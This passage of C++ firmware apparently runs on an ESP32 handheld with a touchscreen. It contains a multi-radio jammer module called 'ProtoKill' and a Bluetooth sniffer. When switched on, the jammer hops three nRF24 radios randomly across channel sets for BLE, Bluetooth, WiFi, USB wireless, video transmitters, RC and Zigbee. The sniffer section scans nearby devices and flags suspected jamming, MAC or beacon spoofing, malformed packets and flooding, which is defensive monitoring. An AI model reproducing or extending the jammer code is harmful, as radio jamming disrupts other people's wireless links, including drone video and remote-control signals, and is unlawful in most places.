    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, UI_ICON);

    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);

}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText                  += "Unknown";   break;
  }
  Print(modeText, UI_TEXT, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, UI_WARN, false);
}

void checkModeChange() {
  prokillHandleNavButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (modeChangeRequested1) {
    modeChangeRequested1 = false;
    currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();
    printJammerStatus(jammerActive);
  }
}

void prokillSetup() {
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);
  Index = 0;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  updateTFT();

  initializeRadios();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void prokillLoop() {

  if (feature_active && (feature_exit_requested || isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  maintainTouchNavBar();
  tft.drawFastHLine(0, 19, 240, UI_LINE);

  checkModeChange();

  if (jammerActive) {
    if (currentMode == BLE_MODULE) {
      int randomIndex = random(0, sizeof(ble_channels) / sizeof(ble_channels[0]));
      int channel = ble_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == Bluetooth_MODULE) {
      int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
      int channel = bluetooth_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == WiFi_MODULE) {
      int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
      int channel = WiFi_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == USB_WIRELESS_MODULE) {
      int randomIndex = random(0, sizeof(usbWireless_channels) / sizeof(usbWireless_channels[0]));
      int channel = usbWireless_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == VIDEO_TX_MODULE) {
      int randomIndex = random(0, sizeof(videoTransmitter_channels) / sizeof(videoTransmitter_channels[0]));
      int channel = videoTransmitter_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == RC_MODULE) {
      int randomIndex = random(0, sizeof(rc_channels) / sizeof(rc_channels[0]));
      int channel = rc_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == ZIGBEE_MODULE) {
      int randomIndex = random(0, sizeof(zigbee_channels) / sizeof(zigbee_channels[0]));
      int channel = zigbee_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);

    } else if (currentMode == NRF24_MODULE) {
      int randomIndex = random(0, sizeof(nrf24_channels) / sizeof(nrf24_channels[0]));
      int channel = nrf24_channels[randomIndex];
      radio1.setChannel(channel);
      radio2.setChannel(channel);
      radio3.setChannel(channel);
    }
  }
}

}  // namespace ProtoKill

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back
};

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 20;
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 5;
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long lastSeen = 0;
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

class BluetoothSniffer {
private:
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  BLEAdvertisedDeviceCallbacks* bleDeviceCallbacks = nullptr;
  static BluetoothSniffer* snifferInstance;

  void releaseBleCallbacks() {
    if (pBLEScan) {
      pBLEScan->stop();
      pBLEScan->setAdvertisedDeviceCallbacks(nullptr);
    }
    delete bleDeviceCallbacks;
    bleDeviceCallbacks = nullptr;
  }

  static int snifferContentTop() {
    return Y_OFFSET + HEADER_HEIGHT;
  }

  static int snifferVisibleLines() {
    return bleMaxLinesInZone(snifferContentTop(), LINE_HEIGHT);
  }

  static bool snifferLineFits(int lineIndex) {
    const int y = snifferContentTop() + (lineIndex * LINE_HEIGHT);
    return y + LINE_HEIGHT <= bleContentBottom();
  }

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    runUI();

    setupTouchscreen();
    {
      const int bodyH = bleContentBottom() - 37;
      if (bodyH > 0) {
        tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
      }
    }
    tft.setTextSize(1);
    updateHeader();

  }

  void updateHeader() {
    if (!scanning) return;
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawFastHLine(0, 56, 240, UI_LINE);
  }

  void updateDisplay() {
    if (!scanning) return;
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = 0; i < visibleLines; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      if (!snifferLineFits(i)) continue;
      int y = snifferContentTop() + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < visibleLines - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type && snifferLineFits(i + 1)) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, snifferContentTop() + 10);
    }
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (!scanning) return;
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    const int visibleLines = snifferVisibleLines();
    for (int i = visibleLines - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    for (int i = visibleLines; i < MAX_LINES; i++) {
      displayLines[i].text = "";
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? UI_DIM_TEXT : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Possible Spoofing (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    {
      const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
      const int bodyH = bleContentBottom() - bodyTop;
      if (bodyH > 0) {
        tft.fillRect(0, bodyTop, tft.width(), bodyH, TFT_BLACK);
      }
    }
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, 36, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1:
           filterSuspicious();
          break;
        case 2:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  static bool s_headerTouchHeld = false;
  const unsigned long touchCheckInterval = 25;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x = 0;
    int y = 0;
    int hitIcon = -1;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              hitIcon = i;
            }
            break;
          }
        }
      }
    }
    if (hitIcon >= 0) {
      if (!s_headerTouchHeld) {
        if (hitIcon == 2) {
          feature_exit_requested = true;
        } else {
          tft.drawBitmap(iconX[hitIcon], iconY, icons[hitIcon], ICON_SIZE, ICON_SIZE, TFT_BLACK);
          animationState = 1;
          activeIcon = hitIcon;
          lastAnimationTime = millis();
        }
      }
      s_headerTouchHeld = true;
    } else {
      s_headerTouchHeld = false;
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();

    setupTouchscreen();

    initDisplay();

    releaseBleCallbacks();
    pBLEScan = BLEDevice::getScan();
    bleDeviceCallbacks = new AdvertisedDeviceCallbacks(*this);
    pBLEScan->setAdvertisedDeviceCallbacks(bleDeviceCallbacks);
    pBLEScan->setActiveScan(true);
    scanning = true;

    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    if (feature_exit_requested || featureExitButtonPressed()) {
      feature_exit_requested = true;
      return;
    }

    unsigned long now = millis();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    runUI();
    if (feature_exit_requested || featureExitButtonPressed()) {
      feature_exit_requested = true;
      return;
    }
    updateStatusBar();
    cleanupDevices(now);
    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {

        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.startsWith("FILTER MAC ")) {
        filterByMac(input.substring(11));
      } else if (input == "FILTER SUSPICIOUS") {
        filterSuspicious();
      } else if (input == "RESET") {
        deviceCount = 0;
        suspiciousCount = 0;
        lastDeviceCount = -1;
        lastSuspiciousCount = -1;
        lineNumber = 1;
        for (int i = 0; i < MAX_LINES; i++) {
          displayLines[i].text = "";
          displayLines[i].color = GREEN;
          displayLines[i].originalColor = GREEN;
          displayLines[i].isAlert = false;
          displayLines[i].flashUntil = 0;
          displayLines[i].type = MessageType::DEVICE;
        }
        refreshDisplay();
        addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice* advertisedDevice) override {
      if (!sniffer.scanning) return;
      String mac = advertisedDevice->getAddress().toString().c_str();
      int rssi = advertisedDevice->getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
      int idx = -1;
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               param->disc_res.bda[0], param->disc_res.bda[1], param->disc_res.bda[2],
               param->disc_res.bda[3], param->disc_res.bda[4], param->disc_res.bda[5]);
      String mac = macStr;
      for (int i = 0; i < snifferInstance->deviceCount; i++) {
        if (snifferInstance->devices[i].mac == mac && !snifferInstance->devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        snifferInstance->devices[idx].packetCount++;
        snifferInstance->devices[idx].lastSeen = timestamp;
        snifferInstance->checkSuspiciousActivity(idx, timestamp);
      } else {
        snifferInstance->processNewDevice(nullptr, param, timestamp, false);
      }
    }
  }

  void startBLEScan() {
    newDevicesThisScan = 0;
    constexpr int kScanChunkSec = 1;
    for (int elapsed = 0; elapsed < Config::bleScanDuration; elapsed += kScanChunkSec) {
      if (feature_exit_requested || featureExitButtonPressed()) {
        feature_exit_requested = true;
        if (pBLEScan) {
          pBLEScan->stop();
        }
        return;
      }
      pBLEScan->start(kScanChunkSec, false);
    }
    addLine("BLE Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void startBTScan() {
    newDevicesThisScan = 0;

    addLine("Classic BT Scan Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
    updateHeader();
  }

  void setSnifferInstance() {
    snifferInstance = this;
  }

  void stop() {
    scanning = false;
    snifferInstance = nullptr;
    releaseBleCallbacks();
  }
};

BluetoothSniffer* BluetoothSniffer::snifferInstance = nullptr;
BluetoothSniffer sniffer;

void blesnifferSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleSetExitOnlyNavLabels();
  bleClearBody(TFT_BLACK);
  {
    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
  }
  redrawTouchButtonBar();
  {
    const int bodyH = bleContentBottom() - 37;
    if (bodyH > 0) {
      tft.fillRect(0, 37, 240, bodyH, TFT_BLACK);
    }
  }
  sniffer.setup();
  sniffer.setSnifferInstance();
  redrawTouchButtonBar();
}

void blesnifferLoop() {

  if (feature_active && featureExitButtonPressed()) {
    feature_exit_requested = true;
    return;
  }

  sniffer.loop();
}

void exit() {

  sniffer.stop();
}
}
